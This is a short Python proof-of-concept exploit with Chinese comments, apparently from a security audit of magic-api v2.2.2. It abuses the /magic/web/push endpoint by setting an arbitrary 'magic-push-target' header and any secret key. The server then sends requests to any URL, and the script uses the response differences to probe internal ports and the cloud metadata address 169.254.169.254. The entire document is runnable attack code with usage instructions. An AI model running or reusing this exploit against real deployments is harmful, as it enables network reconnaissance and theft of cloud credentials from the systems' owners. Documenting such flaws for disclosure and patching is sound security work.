#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-05: /push 反射型 SSRF (magic-api v2.2.2)

POST /magic/web/push
headers:
  magic-push-target:      任意 URL (无白名单)
  magic-push-secret-key:  任意值 (服务端 notBlank 校验)
  magic-push-mode:        SINGLE | FULL
body: [SelectedResource...]

DefaultMagicAPIService.push -> RestTemplate.postForObject(target, ...) -> 服务端发起任意请求。
通过响应差异(成功/连接拒绝/超时)探测内网端口与云元数据端点。

用法:
  python3 poc_f05_push_ssrf.py http://target:9999 http://169.254.169.254/latest/meta-data/
"""
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
TARGET = sys.argv[2] if len(sys.argv) > 2 else 'http://127.0.0.1:9999/magic/web/config.json'

req = urllib.request.Request(
    f'{BASE}/magic/web/push',
    data=b'[]',
    headers={
        'Content-Type': 'application/json',
        'magic-push-target': TARGET,
        'magic-push-secret-key': 'anything',
        'magic-push-mode': 'SINGLE',
    })
try:
    resp = json.loads(urllib.request.urlopen(req, timeout=10).read())
    print('[+] 响应:', resp.get('code'), str(resp.get('data') or resp.get('message'))[:300])
except Exception as e:
    print('[!] 异常(可用于区分端口开放/关闭):', e)
